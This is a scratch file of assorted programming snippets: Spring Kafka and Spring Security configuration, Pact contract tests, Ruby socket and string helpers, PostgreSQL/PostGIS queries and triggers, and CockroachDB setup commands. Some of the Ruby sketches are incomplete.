</bean>



@Bean
public KafkaMessageDrivenChannelAdapter<String, String>
            adapter(KafkaMessageListenerContainer<String, String> container) {
    KafkaMessageDrivenChannelAdapter<String, String> kafkaMessageDrivenChannelAdapter =
            new KafkaMessageDrivenChannelAdapter<>(container, ListenerMode.record);
    kafkaMessageDrivenChannelAdapter.setOutputChannel(received());
    return kafkaMessageDrivenChannelAdapter;
}

@Bean
public KafkaMessageListenerContainer<String, String> container() throws Exception {
    ContainerProperties properties = new ContainerProperties(this.topic);
    // set more properties
    return new KafkaMessageListenerContainer<>(consumerFactory(), properties);
}

@Bean
public ConsumerFactory<String, String> consumerFactory() {
    Map<String, Object> props = new HashMap<>();
    props.put(ConsumerConfig.BOOTSTRAP_SERVERS_CONFIG, this.brokerAddress);
    // set more properties
    return new DefaultKafkaConsumerFactory<>(props);
}
==============================================================================================================
@Bean
public KafkaListenerContainerFactory<ConcurrentMessageListenerContainer<Integer, String>>
        kafkaListenerContainerFactory() {
    ConcurrentKafkaListenerContainerFactory<Integer, String> factory =
            new ConcurrentKafkaListenerContainerFactory<>();
    ...
    factory.getContainerProperties().setBatchErrorHandler(myBatchErrorHandler);
    ...
    return factory;
}
==============================================================================================================
@KafkaListener(id="validated", topics = "annotated35", errorHandler = "validationErrorHandler",
      containerFactory = "kafkaJsonListenerContainerFactory")
public void validatedListener(@Payload @Valid ValidatedClass val) {
    ...
}

@Bean
public KafkaListenerErrorHandler validationErrorHandler() {
    return (m, e) -> {
        ...
    };
}


@Configuration
@EnableKafka
public class Config implements KafkaListenerConfigurer {

    @Autowired
    private LocalValidatorFactoryBean validator;
    ...

    @Override
    public void configureKafkaListeners(KafkaListenerEndpointRegistrar registrar) {
      registrar.setValidator(this.validator);
    }
}
==============================================================================================================
@Bean
public ConcurrentKafkaListenerContainerFactory<Integer, String> kafkaListenerContainerFactory() {
    ConcurrentKafkaListenerContainerFactory<Integer, String> factory =
        new ConcurrentKafkaListenerContainerFactory<>();
    factory.setConsumerFactory(cf());
    factory.setReplyTemplate(template());
    factory.setReplyHeadersConfigurer(new ReplyHeadersConfigurer() {

      @Override
      public boolean shouldCopy(String headerName, Object headerValue) {
        return false;
      }

      @Override
      public Map<String, Object> additionalHeaders() {
        return Collections.singletonMap("qux", "fiz");
      }

    });
    return factory;
}
==============================================================================================================
@Configuration
@EnableKafka
@EnableKafkaStreams
public static class KafkaStreamsConfig {

    @Bean(name = KafkaStreamsDefaultConfiguration.DEFAULT_STREAMS_CONFIG_BEAN_NAME)
    public KafkaStreamsConfiguration kStreamsConfigs() {
        Map<String, Object> props = new HashMap<>();
        props.put(StreamsConfig.APPLICATION_ID_CONFIG, "testStreams");
        props.put(StreamsConfig.KEY_SERDE_CLASS_CONFIG, Serdes.Integer().getClass().getName());
        props.put(StreamsConfig.VALUE_SERDE_CLASS_CONFIG, Serdes.String().getClass().getName());
        props.put(StreamsConfig.TIMESTAMP_EXTRACTOR_CLASS_CONFIG, WallclockTimestampExtractor.class.getName());
        return new KafkaStreamsConfiguration(props);
    }

    @Bean
    public KStream<Integer, String> kStream(StreamsBuilder kStreamBuilder) {
        KStream<Integer, String> stream = kStreamBuilder.stream("streamingTopic1");
        stream
                .mapValues(String::toUpperCase)
                .groupByKey()
                .reduce((String value1, String value2) -> value1 + value2,
                		TimeWindows.of(1000),
                		"windowStore")
                .toStream()
                .map((windowedId, value) -> new KeyValue<>(windowedId.key(), value))
                .filter((i, s) -> s.length() > 40)
                .to("streamingTopic2");

        stream.print();

        return stream;
    }
}
==============================================================================================================
import au.com.dius.pact.consumer.Pact;
import au.com.dius.pact.consumer.PactProviderRuleMk2;
import au.com.dius.pact.consumer.PactVerification;
import au.com.dius.pact.consumer.dsl.PactDslWithProvider;
import au.com.dius.pact.model.RequestResponsePact;
import org.junit.Rule;
import org.junit.Test;
import org.springframework.http.*;
import org.springframework.web.client.RestTemplate;

import java.util.HashMap;
import java.util.Map;

import static org.assertj.core.api.Assertions.assertThat;

public class PactConsumerDrivenContractUnitTest {

    @Rule
    public final PactProviderRuleMk2 mockProvider = new PactProviderRuleMk2("test_provider", "localhost", 8080, this);

    @Pact(consumer = "test_consumer")
    public RequestResponsePact createPact(final PactDslWithProvider builder) {
        Map<String, String> headers = new HashMap<String, String>();
        headers.put("Content-Type", "application/json");

        return builder.given("test GET").uponReceiving("GET REQUEST").path("/pact")
                .method("GET").willRespondWith().status(200)
                .headers(headers).body("{\"condition\": true, \"name\": \"tom\"}").given("test POST").uponReceiving("POST REQUEST").method("POST")
                .headers(headers).body("{\"name\": \"Michael\"}").path("/pact").willRespondWith().status(201).toPact();
    }

    @Test
    @PactVerification()
    public void givenGet_whenSendRequest_shouldReturn200WithProperHeaderAndBody() {
        // when
        final ResponseEntity<String> response = new RestTemplate().getForEntity(mockProvider.getUrl() + "/pact", String.class);

        // then
        assertThat(response.getStatusCode().value()).isEqualTo(200);
        assertThat(response.getHeaders().get("Content-Type").contains("application/json")).isTrue();
        assertThat(response.getBody()).contains("condition", "true", "name", "tom");

        // and
        final HttpHeaders httpHeaders = new HttpHeaders();
        httpHeaders.setContentType(MediaType.APPLICATION_JSON);

        final String jsonBody = "{\"name\": \"Michael\"}";

        // when
        final ResponseEntity<String> postResponse = new RestTemplate().exchange(this.mockProvider.getUrl() + "/pact", HttpMethod.POST, new HttpEntity<>(jsonBody, httpHeaders), String.class);

        // then
        assertThat(postResponse.getStatusCode().value()).isEqualTo(201);
    }
}
==============================================================================================================
"providerState": "provider fetches product by id and client has valid license",
==============================================================================================================
{
    "provider": {
        "name": "test_provider"
    },
    "consumer": {
        "name": "test_consumer"
    },
    "interactions": [
        {
            "description": "GET REQUEST",
            "request": {
                "method": "GET",
                "path": "/pact"
            },
            "response": {
                "status": 200,
                "headers": {
                    "Content-Type": "application/json"
                },
                "body": {
                    "condition": true,
                    "name": "tom"
                }
            },
            "providerStates": [
                {
                    "name": "test GET",
                    "params": {
                        "test-name": "test-value"
                    }
                }
            ]
        },
        {
            "description": "POST REQUEST",
            "request": {
                "method": "POST",
                "path": "/pact",
                "headers": {
                    "Content-Type": "application/json"
                },
                "body": {
                    "name": "Michael"
                }
            },
            "response": {
                "status": 201
            },
            "providerStates": [
                {
                    "name": "test POST"
                }
            ]
        }
    ],
    "metadata": {
        "pact-specification": {
            "version": "3.0.0"
        },
        "pact-jvm": {
            "version": "3.5.0"
        }
    }
}
==============================================================================================================
I use spring-boot in my project, and I run this jar file which is built by spring-boot as a service on Centos. When I run this service:

service myApp start

I always get the below error messages:

2016-08-26 09:11:02.002 ERROR 31900 --- [           main] o.s.b.c.FileEncodingApplicationListener  : System property 'file.encoding' is currently 'ANSI_X3.4-1968'. It should be 'UTF-8' (as defined in 'spring.mandatoryFileEncoding').
2016-08-26 09:11:02.018 ERROR 31900 --- [           main] o.s.b.c.FileEncodingApplicationListener  : Environment variable LANG is 'null'. You could use a locale setting that matches encoding='UTF-8'.
2016-08-26 09:11:02.018 ERROR 31900 --- [           main] o.s.b.c.FileEncodingApplicationListener  : Environment variable LC_ALL is 'null'. You could use a locale setting that matches encoding='UTF-8'.
2016-08-26 09:11:02.031 ERROR 31900 --- [           main] o.s.boot.SpringApplication               : Application startup failed
java.lang.IllegalStateException: The Java Virtual Machine has not been configured to use the desired default character encoding (UTF-8).
    at org.springframework.boot.context.FileEncodingApplicationListener.onApplicationEvent(FileEncodingApplicationListener.java:74) ~[spring-boot-1.3.7.RELEASE.jar!/:1.3.7.RELEASE]
If I run this jar file directly, then this application runs properly.

java -jar target/myApp-1.0.jar

 .   ____          _            __ _ _
 /\\ / ___'_ __ _ _(_)_ __  __ _ \ \ \ \
( ( )\___ | '_ | '_| | '_ \/ _` | \ \ \ \
 \\/  ___)| |_)| | | | | || (_| |  ) ) ) )
  '  |____| .__|_| |_|_| |_\__, | / / / /
 =========|_|==============|___/=/_/_/_/
 :: Spring Boot ::        (v1.3.7.RELEASE)

......

2016-08-26 09:54:34.954 DEBUG 32035 --- [           main] o.s.w.s.resource.ResourceUrlProvider     : Found resource handler mapping: URL pattern="/**", locations=[ServletContext resource [/], class path resource [META-INF/resources/], class path resource [resources/], class path resource [static/], class path resource [public/]], resolvers=[org.springframework.web.servlet.resource.PathResourceResolver@1817d444]
2016-08-26 09:54:35.051  INFO 32035 --- [           main] s.b.c.e.t.TomcatEmbeddedServletContainer : Tomcat started on port(s): 8000 (http)
2016-08-26 09:54:35.053 DEBUG 32035 --- [           main] o.s.w.c.s.StandardServletEnvironment     : Adding [server.ports] PropertySource with highest search precedence
2016-08-26 09:54:35.061  INFO 32035 --- [           main] co.nz.myApplication           : Started myApplication in 12.339 seconds (JVM running for 13.183)
This is pom.xml:

<project>
....

 <parent>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-parent</artifactId>
    <version>1.3.7.RELEASE</version>
    <relativePath/>
 </parent>

 <properties>
    <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
    <java.version>1.8</java.version>
 </properties>
 ....

 <build>
    <plugins>
        <plugin>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-maven-plugin</artifactId>
            <configuration>
                <executable>true</executable>
                <jvmArguments>-Dfile.encoding=UTF8 -Dspring.profiles.active="production"</jvmArguments>
            </configuration>
            <dependencies>
                <dependency>
                    <groupId>org.springframework</groupId>
                    <artifactId>springloaded</artifactId>
                    <version>1.2.5.RELEASE</version>
                </dependency>
            </dependencies>
        </plugin>
    </plugins>
 </build>
 
 
 "providerStates": [
                {
                    "name": "provider deletes email template",
                    "params": {
                        "test-name": "test-value"
                    }
                }
            ],
			
 Gson gson = new GsonBuilder().disableHtmlEscaping().create();
resp.getWriter().println(gson.toJson(json));
==============================================================================================================
sudo gem install waves
waves generate -t classic -n myapp
cd myapp
waves server

[dan@yoda dolphin (open-source)]$ ./bin/dolphin configure aws --help
Usage: ./bin/dolphin (options)
    -g, --group GROUP                The AWS security group to use for new instances
    -i, --image IMAGE                The AWS image for provisioning pods
    -k, --key KEY                    Your AWS account key
    -p, --keypair KEYPAIR            The AWS keypair name to use with SSH
    -r, --region REGION              The region (datacenter) for region-specific options
    -s, --secret SECRET              Your AWS account secret
    -h, --help                       Show this message
==============================================================================================================
// So we start with a function that will allow to create new functions that 
// convert errors into events. 

var safeFactory = function(emitter) {
  return function(fn) {
    return function(err,value) {
    if (err) { emitter.emit("error",err); }
    else fn(value);
    }
  }
};

// Then you can do:
// 
//     var safe = safeFactory(this);
//     
//       ...
//       
//     asyncThing(safe(myCallback));
//     
//     
// Or (assuming you have a library like underscore):
// 
//     asyncThing(safe(_.bind(this,myCallback)));
//     
// This opens the possibility of defining a function that defines a method 
// that converts an async call into a safe invocation.

var safeMethodFactory = function(object,method,async,callback) {
  return function() {
    var args = _(arguments); // converts arguments to an Array
    args.push(safe(_.bind(object,callback)));
    return async(args);
  }
};
// 
// So now you could do something like this:
// 
//     var A = function() {
//       this.readFile = safeMethodFactory(this,fs.readFile,this.parse);
//     }
==============================================================================================================
# first we will give Domains a little help

class Domain < String
  def subdomain( rank = 1 ) ; self.split('.')[0..(rank-1)].join('.') ; end
  def level( rank ) ; self.split('.')[(rank*-1)..-1].join('.') ; end
  def top_level ; level(1) ; end
end

# now we can treat them like strings but also access domain components naturally

d = Domain.new("store.apple.co.uk")
d == "store.apple.co.uk"              # => true
d =~ /^store/                         # => 0
d.subdomain                           # => "store"
d.subdomain(2)                        # => "store.apple"
d.top_level                           # => "uk"
d.level(2)                            # => "co.uk"
d.level(3)                            # => "apple.co.uk"

# within request mappings, we can pass lambda constraints:



:domain => lambda { |d| d.level(2) == "co.uk" }


      def satisfy?( request )
        METHODS.all? do | method |
          wanted = instance_variable_get( "@#{method}")
          got = request.send( method ) if wanted
          wanted.is_a? Proc ? wanted.call( got ) : wanted === got
        end
      end
	  


require 'socket'
require 'rubygems'
require 'monitor'

include Socket::Constants

lock = Mutex.new ; buf = []
client = Connection.new( 2201, '10.45.10.219' ).listen
server = Connection.new( 2202, '10.45.10.219' ).connect
stop = false

class YPCSocket
  def initialize( port, ip )
    @socket = Socket.new( AF_INET, SOCK_STREAM, 0 )
    @address = Socket.pack_sockaddr_in( port, ip )
  end
  def close ; @socket.close ; end
  def listen
    @socket.bind( @address ).listen( 1 )
  end
  def connect
    @socket.connect( @address  )
  end
  def accept
    Connection.new( @socket.accept.first )
  end
  
  class Connection
    def initialize( socket )
      @socket = socket
    end
    def read ; @socket.gets.chomp ; end
  end
end

def read
  connection = client.accept
  while ( data = connection.read && data != 'END' )
    lock.synchronize { buf << data }
  end
  stop = true
end

def write
  until( stop ) do
    lock.synchronize { data = buf.pop unless buf.empty? }
    server.puts( data ) if data
  end
end


Thread.start { read }
Thread.start { write }

client.close ; server.close
==============================================================================================================
#!/usr/bin/env ruby

class BufferedString
  
  class Buffer < String
    
    def initialize
      @eof = false
      super
    end
    
    def eof?
      @eof
    end
    
    def close!
      @eof = true
    end
    
  end

  def initialize
    @buf = Buffer.new
    @pos = 0 
  end
  
  def initialize_copy( from )
    @buf = from.instance_eval { @buf }
    @pos = 0
  end
  
  def read
    rval = @buf[ @pos..-1 ]
    @pos += ( @buf.length - @pos )
    return rval
  end
  
  def close!
    @buf.close!
  end
  
  def eof?
    @buf.eof? and @pos >= @buf.length
  end
  
  def seek(pos) ; @pos = pos ; end
  
  def write( string )
    @buf.insert(@pos,string)
  end
  
  def method_missing(name,*args,&block)
    @buf.send(name,*args,&block)
  end
  
end

io = BufferedString.new
ioread = io.dup
writer = Thread.new do
  io << "xxx" while ( io.length < 1000 )
  io.close!
end
reader = Thread.new do
  p ioread.read until ioread.eof?
end
sleep 1 while [ reader, writer ].find { |thread| thread.alive? }

io = BufferedString.new
ioread = io.dup
io << "dan"
io.seek(0)
io.write("hello ")
p ioread.read
==============================================================================================================
require 'socket'

class Server
  
  def initialize( port )
    @server = TCPServer.new( port )
    @threads = []
  end
  
  def run( &block )
    begin
      request = nil
      trap( 'INT' ) { shutdown }
      loop do
      	begin
      		request = @server.accept_nonblock
      	rescue Errno::EAGAIN, Errno::ECONNABORTED, Errno::EPROTO, Errno::EINTR
      	  @threads.delete_if { |t| !t.alive? && t.join }
      		IO.select([@server])
      		retry
      	end
      	process( request, block )
      end
    rescue
      shutdown
    end
  end
  
  private
  
  def process( request, block )
  	@threads << Thread.new do
  	  data = '' ; chunk = nil
  	  loop do 
    	  chunk = request.recv_nonblock(16*1024)
  	    data << chunk
  	    puts "CHUNK #{chunk.size}"
  	    break if chunk.size == 0
  	  end
  	  puts "READ #{data.size}"
      request.close_read
      IO.select([], [request])
  		request.print( block[ data ] )
  	  request.close
    end
  end

  def shutdown
    @server.close
    exit
  end
  
end





DELIMITERS = [ ['(',')'], ['{','}'], ['[',']'] ]
def match?( string, stack = [] )
  return true if string.empty? and stack.empty?
  first = string[0,1] ; DELIMITERS.any? do | open, close |
    case first
    when open then match?( string[1..-1], stack.clone.push( close ) )
    when close then match?( string[1..-1], stack ) if stack.clone.pop == close
    else false
    end
  end
end

Assert.assertTrue(new ReflectionEquals(expected, excludeFields).matches(actual));

module MetaHelper
  
  # include this anywhere you want to refer to the model, controller, etc., generically
  # all methods are prefixed with x_ to avoid name clashes with existing methods
  
  def x_controller_class ; self.class ; end
  def x_controller_name ; self.class.name.underscore.gsub('_controller', '') ; end
  def x_model_name ; x_controller_name.singularize ; end
  def x_model_class ; x_model_name.camelize.constantize ; end
  def x_mailer_name ; x_model_name + "_mailer" ; end
  def x_mailer_class ; x_mailer_name.camelize.constantize ; end
  def x_instance ; instance_variable_get( "@#{x_model_name}" ) ; end
  def x_collection ; instance_variable_get( "@#{x_model_name.pluralize}" ) ; end
  def x_find( id ) ; instance_variable_set( "@#{x_model_name}", x_model_class.find( id ) ) ; end
  def x_find_all ; instance_variable_set( "@#{x_model_name.pluralize}", x_model_class.find( :all ) ) ; end
  def t( key, options = {} ) 
    I18n.t( 
      ( key =~ /^\./ ? "#{x_controller_name}.#{params[:action]}#{key}" : key ), 
      options )
  end
  
end
==============================================================================================================
package com.paragon.microservices.distributor.system.handler;

import com.paragon.microservices.distributor.system.configuration.DelegatedObjectMapper;
import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;
import org.springframework.http.HttpEntity;
import org.springframework.http.HttpMethod;
import org.springframework.http.ResponseEntity;
import org.springframework.http.client.ClientHttpRequest;
import org.springframework.http.client.ClientHttpResponse;
import org.springframework.lang.NonNull;
import org.springframework.lang.Nullable;
import org.springframework.stereotype.Component;
import org.springframework.web.client.HttpMessageConverterExtractor;
import org.springframework.web.client.RequestCallback;
import org.springframework.web.client.ResponseExtractor;
import org.springframework.web.client.RestTemplate;

import java.io.IOException;
import java.lang.reflect.Type;
import java.net.URI;
import java.util.Objects;
import java.util.Optional;

@Slf4j
@Component
@RequiredArgsConstructor
public class CustomRestTemplate extends RestTemplate {
    private final DelegatedObjectMapper delegatedObjectMapper;

    /**
     * {@inheritDoc}
     *
     * @see RestTemplate
     */
    @NonNull
    @Override
    public <T> ResponseExtractor<ResponseEntity<T>> responseEntityExtractor(final Type responseType) {
        return new ResponseEntityResponseExtractor<>(this.delegatedObjectMapper, responseType);
    }

    /**
     * {@inheritDoc}
     *
     * @see RestTemplate
     */
    @NonNull
    @Override
    public <T> RequestCallback httpEntityCallback(@Nullable final Object requestBody, @NonNull final Type responseType) {
        if (log.isInfoEnabled()) {
            log.info(
                    " >>> Request payload: {}, response type: {} >>> ",
                    this.delegatedObjectMapper.toJsonExternal(requestBody),
                    responseType.getTypeName()
            );
        }
        return super.httpEntityCallback(requestBody, responseType);
    }

//    /**
//     * {@inheritDoc}
//     *
//     * @see RestTemplate
//     */
//    @Nullable
//    protected <T> T doExecute(final URI url,
//                              @Nullable final HttpMethod method,
//                              @Nullable final RequestCallback requestCallback,
//                              @Nullable final ResponseExtractor<T> responseExtractor) throws RestClientException {
//        logger.info(url);
//        if (log.isInfoEnabled()) {
//            log.info(
//                    " >>> Request '{} {}' on client service with headers: {} >>> ",
//                    method,
//                    url
//            );
//        }
//        return super.doExecute(url, method, requestCallback, responseExtractor);
//    }

    /**
     * {@inheritDoc}
     *
     * @see RestTemplate
     */
    @NonNull
    @Override
    protected ClientHttpRequest createRequest(@NonNull final URI url, @NonNull final HttpMethod method) throws IOException {
        final ClientHttpRequest request = super.createRequest(url, method);
        if (log.isInfoEnabled()) {
            log.info(
                    " >>> Request '{} {}' on client service with headers: {} >>> ",
                    request.getMethod(),
                    request.getURI(),
                    request.getHeaders()
            );
        }
        return request;
    }

    /**
     * Custom {@link ResponseExtractor} implementation for {@link HttpEntity}
     */
    public class ResponseEntityResponseExtractor<T> implements ResponseExtractor<ResponseEntity<T>> {
        @NonNull
        private final DelegatedObjectMapper delegatedObjectMapper;
        @Nullable
        private final HttpMessageConverterExtractor<T> delegate;

        ResponseEntityResponseExtractor(final DelegatedObjectMapper delegatedObjectMapper, @Nullable final Type responseType) {
            this.delegatedObjectMapper = delegatedObjectMapper;
            this.delegate = Optional.ofNullable(responseType)
                    .filter(value -> Void.class != value)
                    .map(value -> new HttpMessageConverterExtractor<T>(value, getMessageConverters()))
                    .orElse(null);
        }

        @Override
        public ResponseEntity<T> extractData(@NonNull final ClientHttpResponse response) throws IOException {
            if (Objects.nonNull(this.delegate)) {
                final T body = this.delegate.extractData(response);
                if (log.isInfoEnabled()) {
                    log.info(
                            " >>> Response '{}' on client service with headers: {} <<< data response: {} ",
                            response.getStatusCode(),
                            response.getHeaders(),
                            this.delegatedObjectMapper.toJsonExternal(body)
                    );
                }
                return ResponseEntity.status(response.getRawStatusCode()).headers(response.getHeaders()).body(body);
            }
            return ResponseEntity.status(response.getRawStatusCode()).headers(response.getHeaders()).build();
        }
    }
}

==============================================================================================================
 // package & imports
 @RestController
 public class UserController {
     @RequestMapping("/users") /* Maps to all HTTP actions by default (GET,POST,..)*/
     public @ResponseBody
     String getUsers() {
         return "{\"users\":[{\"firstname\":\"Richard\", \"lastname\":\"Feynman\"}," +
             "{\"firstname\":\"Marie\",\"lastname\":\"Curie\"}]}";
     }
 }
==============================================================================================================
public class JWTLoginFilter extends AbstractAuthenticationProcessingFilter {
    private TokenAuthenticationService tokenAuthenticationService;
    public JWTLoginFilter(String url, AuthenticationManager authenticationManager) {
         super(new AntPathRequestMatcher(url));
         setAuthenticationManager(authenticationManager);
         tokenAuthenticationService = new TokenAuthenticationService();
    }
}


 @Configuration
 @EnableWebSecurity
 public class WebSecurityConfig extends WebSecurityConfigurerAdapter {
     @Override
     protected void configure(HttpSecurity http) throws Exception {
         // disable caching
         http.headers().cacheControl();
         http.csrf().disable() // disable csrf for our requests.
             .authorizeRequests()
             .antMatchers("/").permitAll()
             .antMatchers(HttpMethod.POST, "/login").permitAll()
             .anyRequest().authenticated()
             .and()
             // We filter the api/login requests
             .addFilterBefore(new JWTLoginFilter("/login", authenticationManager()), UsernamePasswordAuthenticationFilter.class)
             // And filter other requests to check the presence of JWT in header
             .addFilterBefore(new JWTAuthenticationFilter(), UsernamePasswordAuthenticationFilter.class);
     }
==============================================================================================================
package com.paragon.mailingcontour.commons.utils;

import lombok.experimental.UtilityClass;

@UtilityClass
public class JreUtil {
    public static final int JAVA_VERSION = getJavaVersion();
    private static Boolean _modular;
    private static Boolean _modularRuntime;

    private static int getJavaVersion() {
        String version = System.getProperty("java.version");
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < version.length(); i++) {
            char c = version.charAt(i);
            if (Character.isDigit(c)) {
                sb.append(c);
            } else {
                break;
            }
        }
        int major = Integer.parseInt(sb.toString());
        major = major == 1 ? 8 : major;
        return major;
    }

    public static boolean isJava8() {
        return JAVA_VERSION == 8;
    }

    public static boolean isJava9() {
        return JAVA_VERSION == 9;
    }

    public static boolean isJava9orLater() {
        return !isJava8();
    }

    public static boolean isJava12() {
        return JAVA_VERSION == 12;
    }

    public static boolean isJava12orLater() {
        return JAVA_VERSION >= 12;
    }

    public static boolean isJava9Modular_compiler(final Object ctx) {
        if (_modular == null) {
            if (isJava8()) {
                _modular = false;
            } else {
                final Object modulesUtil = ReflectUtil.method(ReflectUtil.type("com.sun.tools.javac.comp.Modules"), "instance", ReflectUtil.type("com.sun.tools.javac.util.Context")).invokeStatic(ctx);
                final Object defModule = ReflectUtil.method(modulesUtil, "getDefaultModule").invoke();
                _modular = defModule != null && !(boolean) ReflectUtil.method(defModule, "isNoModule").invoke() && !(boolean) ReflectUtil.method(defModule, "isUnnamed").invoke();
            }
        }
        return _modular;
    }

    public static boolean isJava9Modular_runtime() {
        if (_modularRuntime == null) {
            if (isJava8()) {
                _modularRuntime = false;
            } else {
                final Object manifoldModule = ReflectionUtils.method(Class.class, "getModule").invoke(JreUtil.class);
                _modularRuntime = (boolean) ReflectionUtils.method(manifoldModule, "isNamed").invoke();
            }
        }
        return _modularRuntime;
    }
}

==============================================================================================================
INSERT INTO data_raw (tstamp, val)
  SELECT tstamp, FLOOR(random()*100)
  FROM generate_series (
    '2020-01-01 00:00:00' :: TIMESTAMP,
    '2020-01-04 23:00:00' :: TIMESTAMP,
    '1 hour') AS tstamp;
	
SELECT
  tstamp :: DATE +
    concat(
      FLOOR(EXTRACT(HOUR FROM tstamp) / 8)*8,
      ':00:00'
    ) :: TIME AS d,
  avg(val) :: FLOAT
FROM data_raw
GROUP BY d
ORDER BY d;

REFRESH MATERIALIZED VIEW CONCURRENTLY data_view;

CREATE OR REPLACE FUNCTION update_data_agg() RETURNS TRIGGER AS $$
BEGIN
  INSERT INTO data_agg (tstamp, total, num) VALUES (
      NEW.tstamp :: DATE + concat(
        FLOOR(EXTRACT(HOUR FROM NEW.tstamp) / 8)*8,
        ':00:00'
      ) :: TIME, NEW.val, 1
    ) ON CONFLICT (tstamp) DO
    UPDATE SET total = data_agg.total + EXCLUDED.total,
               num = data_agg.num + 1;
    RETURN NULL;
END
$$ LANGUAGE 'plpgsql';

CREATE TRIGGER data_agg_trigger
AFTER INSERT ON data_raw
FOR EACH ROW EXECUTE PROCEDURE update_data_agg();

COPY data_raw TO '/tmp/data_raw.dat';
DELETE FROM data_raw;
COPY data_raw FROM '/tmp/data_raw.dat';

CREATE OR REPLACE FUNCTION data_raw_insert_only() RETURNS TRIGGER AS $$
BEGIN
  RAISE 'UPDATE / DELETE / TRUNCATE are not allowed on data_raw,'
    ' because triggers are involved!';
  RETURN NULL;
END
$$ LANGUAGE 'plpgsql';

CREATE TRIGGER data_raw_ins_only BEFORE UPDATE OR DELETE OR TRUNCATE
ON data_raw EXECUTE PROCEDURE data_raw_insert_only();
==============================================================================================================
sudo apt-get install postgis qgis osm2pgsql

adduser eax
usermod -a -G sudo eax
mkdir /home/eax/.ssh
cp /root/.ssh/authorized_keys /home/eax/.ssh/
chown -R eax:eax /home/eax

apt install ntp
ntpq -pn

sudo systemctl enable cockroachdb
sudo systemctl start cockroachdb
sudo systemctl status cockroachdb

wget https://binaries.cockroachdb.com/cockroach-v19.2.2.linux-amd64.tgz
tar -xvzf cockroach-v19.2.2.linux-amd64.tgz
sudo cp cockroach-v19.2.2.linux-amd64/cockroach /usr/local/bin

sudo mkdir /var/lib/cockroach
sudo useradd cockroach
sudo chown cockroach /var/lib/cockroach



cockroach sql --insecure
CREATE DATABASE phonebook;
CREATE USER IF NOT EXISTS phonebook;
GRANT ALL ON DATABASE phonebook TO phonebook;
SET DATABASE = phonebook;
CREATE TABLE phonebook(id SERIAL PRIMARY KEY,
                       name VARCHAR(64), phone VARCHAR(64));
INSERT INTO phonebook (name, phone) VALUES ('Alice', '123');
INSERT INTO phonebook (name, phone) VALUES ('Bob', '456');
SELECT * FROM phonebook;
INSERT INTO phonebook(name,phone)
  SELECT 'user_' || n :: TEXT, '100' || n :: TEXT
    FROM generate_series(1,10000) AS n;
DROP TABLE phonebook;


sudo -u postgres psql
\c mydatabase
create extension postgis;

CREATE TABLE my_points(id SERIAL PRIMARY KEY, name TEXT);
SELECT AddGeometryColumn('my_points', 'point', 4326, 'POINT', 2);
INSERT INTO my_points (name, point)
  VALUES ('Центр Москвы',
           ST_GeomFromEWKT('SRID=4326;POINT(37.617635 55.755814)'));
		   
select id, name, ST_AsText(point) as point from my_points;
wget 'http://download.geofabrik.de/europe/'\
'russia-european-part-150101.osm.pbf'
osm2pgsql -s -d mydatabase -U eax -H localhost -W \
  ./russia-european-part-150101.osm.pbf
  
SELECT amenity, COUNT(*) AS cnt
FROM planet_osm_point
WHERE amenity <> ''
GROUP BY amenity
ORDER BY cnt DESC
LIMIT 10;


CREATE TABLE cities(id SERIAL PRIMARY KEY, name TEXT);
SELECT AddGeometryColumn('cities', 'polygon', 4326, 'POLYGON', 2);
CREATE INDEX cities_idx ON cities USING gist(polygon);
INSERT INTO cities(name, polygon)
  SELECT DISTINCT ON (name) name, ST_Transform(way, 4326)
  FROM planet_osm_polygon WHERE place = 'city';
  
SELECT name, ST_AsEWKT(point),
       ST_Distance(
         point :: geography,
         ST_GeomFromEWKT(
           'SRID=4326;POINT(37.617635 55.755814)'
         ) :: geography
       ) AS dist
FROM cafes ORDER BY dist LIMIT 3;

SELECT name, ST_AsEWKT(point)
FROM cafes
WHERE ST_DWithin(
        point,
        ST_GeomFromEWKT('SRID=4326;POINT(37.617635 55.755814)'),
        0.005);
		
SELECT
  name,
  ST_AsText(point) AS gps,
  ST_DistanceSphere(
    point,
    ST_GeomFromEWKT('SRID=4326;POINT(37.617635 55.755814)')
  ) AS dist
FROM cafes
ORDER BY point <-> ST_GeomFromEWKT(
                     'SRID=4326;POINT(37.617635 55.755814)'
                   )
LIMIT 10;

WITH subq AS (
  SELECT name, ST_AsText(point) AS gps,
         ST_DistanceSphere(
           point,
           ST_GeomFromEWKT('SRID=4326;POINT(37.617635 55.755814)')
         ) AS dist
  FROM cafes
  ORDER BY point <-> ST_GeomFromEWKT(
                       'SRID=4326;POINT(37.617635 55.755814)'
                     )
  LIMIT 15
) SELECT * FROM subq ORDER BY dist LIMIT 10;
==============================================================================================================
# select to_tsvector('My name is Alex and I''m a software developer.');
                   to_tsvector                    
--------------------------------------------------
 'alex':4 'develop':10 'm':7 'name':2 'softwar':9
(1 row)

# select to_tsvector('russian', 'Меня зовут Саша и я программист.');
            to_tsvector            
-----------------------------------
 'зовут':2 'программист':6 'саш':3
(1 row)
==============================================================================================================
-- экспорт таблицы
COPY tname TO PROGRAM 'gzip > /tmp/data.gz';
-- экспорт данных по запросу
COPY (SELECT * FROM tname WHERE ...) TO PROGRAM 'gzip > /tmp/data.gz';
-- импорт данных
COPY tname FROM PROGRAM 'zcat /tmp/data.gz';
==============================================================================================================
SET CLUSTER SETTING sql.trace.log_statement_execute = true;
SET CLUSTER SETTING sql.trace.log_statement_execute = false;

docker run -d --name cockroach -p 5432:26257 -p 8080:8080 \
  cockroachdb/cockroach:v19.2.3 start-single-node --insecure
docker exec -it cockroach ./cockroach sql --insecure
==============================================================================================================
# select to_tsvector('Hello,') || to_tsvector('world!');
      ?column?      
---------------------
 'hello':1 'world':2
(1 row)

# select to_tsquery('Hello | world');
    to_tsquery    
-------------------
 'hello' | 'world'
(1 row)

# select to_tsquery('russian', 'Привет & мир');
    to_tsquery    
------------------
 'привет' & 'мир'
(1 row)

# select plainto_tsquery('Hello world');
  plainto_tsquery  
-------------------
 'hello' & 'world'
(1 row)

# select phraseto_tsquery('russian', 'Привет мир');
  phraseto_tsquery  
--------------------
 'привет' <-> 'мир'
(1 row)

# select to_tsvector('Hello, world!') @@
  plainto_tsquery('hello world') as match;
 match
-------
 t
(1 row)

# select to_tsvector('Hello, world!') @@
  plainto_tsquery('goodbye world') as match;
 match
-------
 f
 
CREATE TABLE IF NOT EXISTS
